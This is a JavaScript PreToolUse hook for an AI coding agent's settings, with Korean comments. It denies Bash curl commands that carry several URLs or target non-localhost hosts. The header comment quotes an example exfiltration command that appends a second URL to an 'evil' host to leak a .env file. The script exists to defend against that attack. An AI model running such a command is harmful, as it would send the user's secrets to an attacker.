// 목적: Bash curl 호출에 URL이 2개 이상이거나 localhost/127.0.0.1이 아닌 호스트가 섞이면 실행 전 차단.
// 사용처: .claude/settings.local.json의 PreToolUse(Bash) 훅에서 stdin으로 호출됨.
// 근거: allow 규칙은 텍스트 글롭이라 `curl -s http://localhost:X https://evil/exfil` 형태로
//       두 번째 URL을 얹어 .env를 유출하는 경로를 패턴만으로는 막을 수 없었음.

let raw = '';
process.stdin.on('data', (c) => (raw += c));
process.stdin.on('end', () => {
  let input;
  try {
    input = JSON.parse(raw);
  } catch {
    process.exit(0);
  }
  const cmd = input?.tool_input?.command;
  if (input?.tool_name !== 'Bash' || typeof cmd !== 'string') process.exit(0);

  const segments = cmd.split(/&&|\|\||;|\|/).map((s) => s.trim());
  const ALLOWED_HOSTS = new Set(['localhost', '127.0.0.1', '::1']);

  for (const seg of segments) {
    if (!/(^|[\s])curl(\s|$)/.test(seg)) continue;
    const urls = seg.match(/https?:\/\/[^\s'"]+/g) ?? [];
    let reason = null;
    if (urls.length > 1) {
      reason = `curl 호출 하나에 URL이 ${urls.length}개 있음 (두 번째 URL로 데이터 유출 가능) — 분리해서 각각 실행할 것`;
    } else if (urls.length === 1) {
      try {
        const host = new URL(urls[0]).hostname;
        if (!ALLOWED_HOSTS.has(host)) reason = `localhost/127.0.0.1이 아닌 호스트로 curl 요청: ${host}`;
      } catch {
        reason = `URL 파싱 실패: ${urls[0]}`;
      }
    }
    if (reason) {
      process.stdout.write(
        JSON.stringify({
          hookSpecificOutput: {
            hookEventName: 'PreToolUse',
            permissionDecision: 'deny',
            permissionDecisionReason: `curl-guard: ${reason}`,
          },
        }),
      );
      return process.exit(0);
    }
  }
  process.exit(0);
});
